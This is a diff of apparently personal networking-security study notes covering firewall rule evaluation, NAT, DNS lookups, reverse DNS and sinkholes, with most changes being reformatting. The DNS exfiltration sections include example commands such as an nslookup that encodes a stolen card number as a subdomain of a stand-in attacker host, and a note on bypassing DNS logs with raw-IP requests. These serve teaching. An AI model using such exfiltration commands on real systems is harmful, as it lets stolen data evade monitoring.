@@ -53,23 +53,17 @@ You visit google.com:
 - Firewalls
 	- Rules to prevent incoming and outgoing connections.	
 
-# Firewall Basics
-
-## **Basic Concept**
+**Basic Concept**
 Gatekeeper that inspects traffic and allows/blocks based on rules.  
 **Rule evaluation**: Top-to-bottom, first match wins.
 
----
-
-## **Key Elements**
+**Key Elements**
 - **Source/Destination**: IP addresses
 - **Ports**: Service identifiers (80=HTTP, 443=HTTPS, 22=SSH)
 - **Protocol**: TCP / UDP / ICMP
 - **Action**: Allow / Deny
 
----
-
-## **Example Rule Set**
+**Example Rule Set**
 ```
 1. ALLOW: Source=10.0.0.5, Dest=ANY, Port=443, Protocol=TCP
    → Admin laptop can browse HTTPS anywhere
@@ -84,115 +78,89 @@ Gatekeeper that inspects traffic and allows/blocks based on rules.
    → Default deny everything else
 ```
 
----
-
-## **Real Scenario**
+**Real Scenario**
 Employee tries to SSH to server (192.168.1.100):
 - Checks Rule 1: No (wrong port)
 - Checks Rule 2: **Match** → **DENIED**
 - Stops checking (first match wins)
 
----
-
-## **Stateful vs Stateless**
+**Stateful vs Stateless**
 - **Stateless**: Checks each packet independently
 - **Stateful**: Remembers connections (if you requested something, response is auto-allowed)
 
+---
 
-- NAT 
+### NAT 
 	- Useful to understand IPv4 vs IPv6.
   - IPv4 address conservation is called NAT, IPv6 does not require NAT, 340 undec 
 
+---
 
 - DNS
 	- (53)
 	- Requests to DNS are usually UDP, unless the server gives a redirect notice asking for a TCP connection. Look up in cache happens first. DNS exfiltration. Using raw IP addresses means no DNS logs, but there are HTTP logs. DNS sinkholes.
 	- In a reverse DNS lookup, PTR might contain- 2.152.80.208.in-addr.arpa, which will map to  208.80.152.2. DNS lookups start at the end of the string and work backwards, which is why the IP address is backwards in PTR.
 
-
-# DNS Basics
-
-## **Basic Concept**
+**Basic Concept**
 Translates domain names to IP addresses (like a phone book for the internet).
 
----
-
-## **How It Works**
+**How It Works**
 1. You type: `google.com`
 2. Check local cache first
 3. If not found → Query DNS server (Port 53, UDP)
 4. DNS responds: `142.250.185.46`
 5. Browser connects to that IP
 
----
-
-## **Example Query Flow**
+**Example Query Flow**
 ```
 google.com → Root server → .com server → Google's nameserver → 142.250.185.46
 ```
 
----
-
-## **Key Points**
-
-### **UDP vs TCP**
+**UDP vs TCP**
 - **UDP (default)**: Fast, single packet
 - **TCP**: Used if response >512 bytes or for zone transfers
 
----
-
-### **Reverse DNS (PTR)**
+**Reverse DNS (PTR)**
 - **Forward**: `google.com → 142.250.185.46`
 - **Reverse**: `208.80.152.2 → 2.152.80.208.in-addr.arpa → wikipedia.org`
 - IP reversed because DNS reads right-to-left
 
----
+**Security Relevance**
 
-## **Security Relevance**
-
-### **DNS Exfiltration**
+**DNS Exfiltration**
 Attacker steals data via DNS queries:
 ```
 Query: stolen-password-abc123.attacker.com
 Attacker's DNS server logs the subdomain = exfiltrated data
 ```
 
----
-
-### **Bypassing DNS Logs**
+**Bypassing DNS Logs**
 ```
 curl http://142.250.185.46
 ```
 - No DNS query → No DNS logs  
 - But HTTP logs still show the IP connection
 
----
-
-### **DNS Sinkhole**
+**DNS Sinkhole**
 Redirect malicious domains to dead-end:
 ```
 malware.com → 0.0.0.0 (blocked)
 ```
-
-
 
 - DNS exfiltration 
 	- Sending data as subdomains. 
 	- 26856485f6476a567567c6576e678.badguy.com
 	- Doesn’t show up in http logs. 
 
+DNS Exfiltration Example
 
-# DNS Exfiltration Example
-
-## **Scenario**
+**Scenario**
 1. Attacker compromised Person A's computer via malware.
 2. Malware finds credit card: `4532123456789010` stored in a file.
 3. Attacker needs to **get this data OUT** to their own server.
 4. HTTP is monitored, file transfers blocked.
 
----
-
-## **Solution - DNS Exfiltration**
+**Solution - DNS Exfiltration**
 ```
 Malware on Person A's PC runs:
 nslookup 4532123456789010.exfil.badguy.com
@@ -203,25 +171,20 @@ Attacker's DNS server logs show:
 "Query received for: 4532123456789010.exfil.badguy.com"
 ```
 
----
-
-## **What attacker gets**
+**What attacker gets**
 The credit card number `4532123456789010` (extracted from the subdomain in their logs).
 
----
-
-## **The Trick**
+**The Trick**
 - Data travels **inside the DNS query itself** (as subdomain).
 - Not in the DNS response.
 - Attacker doesn't care about DNS answer.
 - Just needs the query to reach their server so they can log it.
 
----
-
-## **Analogy**
+**Analogy**
 Like writing a secret message on the outside of an envelope, then mailing it to yourself.  
 You don't care what's inside the envelope — the message **IS the address**.
 
+---
 
 - DNS configs
 	- Start of Authority (SOA).
